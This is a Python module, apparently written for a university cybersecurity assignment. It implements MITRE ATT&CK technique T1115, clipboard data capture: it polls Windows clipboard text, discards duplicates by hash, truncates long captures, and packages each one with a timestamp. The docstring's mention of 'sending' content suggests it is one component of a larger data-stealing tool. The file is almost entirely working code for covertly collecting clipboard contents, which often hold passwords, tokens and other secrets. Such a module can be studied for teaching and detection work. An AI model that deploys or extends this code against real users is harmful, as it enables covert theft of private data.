"""
Clipboard Monitor Module
MITRE ATT&CK: T1115 (Clipboard Data)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Captures clipboard contents at regular intervals.
Deduplicates via MD5 hash to avoid sending the same content repeatedly.
"""

import hashlib
from datetime import datetime

try:
    import win32clipboard
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False


class ClipboardMonitor:
    """Monitors clipboard for new text content."""

    MAX_CHARS = 10000  # Cap per capture to avoid huge payloads

    def __init__(self):
        self._last_hash = None

    def capture(self):
        """
        Capture current clipboard text content.

        Returns:
            dict with timestamp, content, char_count — or None if:
            - Clipboard is empty
            - Content is the same as last capture (dedup)
            - win32clipboard not available
        """
        if not HAS_WIN32:
            return None

        try:
            win32clipboard.OpenClipboard()
            try:
                # Get Unicode text from clipboard
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                else:
                    return None
            finally:
                win32clipboard.CloseClipboard()

            if not content or not content.strip():
                return None

            # Dedup via MD5 hash
            content_hash = hashlib.md5(content.encode("utf-8", errors="ignore")).hexdigest()
            if content_hash == self._last_hash:
                return None  # Same content, skip

            self._last_hash = content_hash

            # Cap at MAX_CHARS
            if len(content) > self.MAX_CHARS:
                content = content[:self.MAX_CHARS] + f"\n[...truncated at {self.MAX_CHARS} chars]"

            return {
                "timestamp": datetime.now().isoformat(),
                "content": content,
                "char_count": len(content)
            }

        except Exception:
            return None


if __name__ == "__main__":
    import time

    print("=" * 50)
    print("  Clipboard Monitor Test")
    print("=" * 50)

    if not HAS_WIN32:
        print("\n[!] win32clipboard not available. Install: pip install pywin32")
    else:
        monitor = ClipboardMonitor()
        print("\n[*] Monitoring clipboard for 30 seconds...")
        print("[*] Copy some text to see captures!\n")

        for i in range(6):
            result = monitor.capture()
            if result:
                preview = result["content"][:100].replace("\n", "\\n")
                print(f"[+] Capture: {result['char_count']} chars - {preview}...")
            else:
                print(f"[*] No new clipboard content (check {i+1}/6)")
            time.sleep(5)

        print("\n[*] Test complete")
